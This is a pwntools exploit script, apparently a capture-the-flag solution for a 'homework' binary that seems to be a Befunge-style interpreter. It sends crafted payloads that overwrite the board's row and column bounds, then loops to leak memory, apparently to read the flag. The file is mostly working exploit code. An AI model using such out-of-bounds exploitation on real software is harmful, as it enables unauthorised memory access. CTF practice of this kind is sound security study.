from pwn import *
import re

# =====================
# Configuration
# =====================
binary = "./homework"
elf = context.binary = ELF(binary, checksec=False)



context.log_level = "info"                   # set to "info" for less output

# =====================
# Helpers
# =====================



def start(argv=[], *a, **kw):
    if args.REMOTE:
        HOST = input("Enter the host name: ")
        PORT = int(input("Enter the port-no: "))
        return remote(HOST, PORT)

    elif args.GDB:
        return gdb.debug([elf.path])

    else:
        return process([elf.path])





# =====================
# Exploit
# =====================
io = start()

print(io.recvline())


"""
board[0][1] = loop_counter

(First 22 bytes start)
values_to_clobber(4) = chr(52) + chr(8) + chr(50) + chr(108)
input_to_clobber_rows(12) =  '0' + '0' + 'g' + '0' + '!' + ':' + '+' + '0' + 'g' + '0' + '\' + 'p'

input_to_clobber_cols(5) =  '0' + '!' + ':' + ':' + 'v'
(First 22 bytes end)

(Second 22 bytes start)
input_to_clobber_cols(19) = '<' + '+' + '+' + '0' + 'g' + '0' + '!' + ':' + ':' + ':' + '+' + '+' + '+' + '0' + '!' + ':' + '+' + '0' + 'g' + 'p' + 'v'
(second 22 bytes end)

Third 22 bytes (loop start)

loop_init(22) = 'v' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<' + '<'

(Fourth 22 bytes start) 
loop_body(22) = '>' + '0' + '!' + '0' + 'g' + ':' + '0' + '0' + 'g' + 'g' + '.' + '0' + '!' + '+' + '0' + '!' + '0' + 'p' + '>' + '>' + '^' 



"""

#### payload 1
values_to_clobber = bytes([52]) + bytes([8]) + bytes([50]) + bytes([108])
clobber_rows_to_52 = b'00g0!:+0g0\\p'
clobber_cols_to_108_1 = b'0!::v'



payload1 = values_to_clobber + clobber_rows_to_52 + clobber_cols_to_108_1


#### payload 2
clobber_cols_to_108_2 = b'<++0g0!:::+++0!:+0gpv'
payload2 = clobber_cols_to_108_2[::-1]

payload3 = b'v<<<<<<<<<<<<<<<<<<<<'

#### payload 3
payload4 = b'>0!0g:00gg.0!+0!0p>>^'

io.sendline(payload1)
io.sendline(payload2)
io.sendline(payload3)
io.sendline(payload4)

io.interactive()
#print("flag in decimal:",io.recvuntil(b'homework:').split(b'homework:')[0])
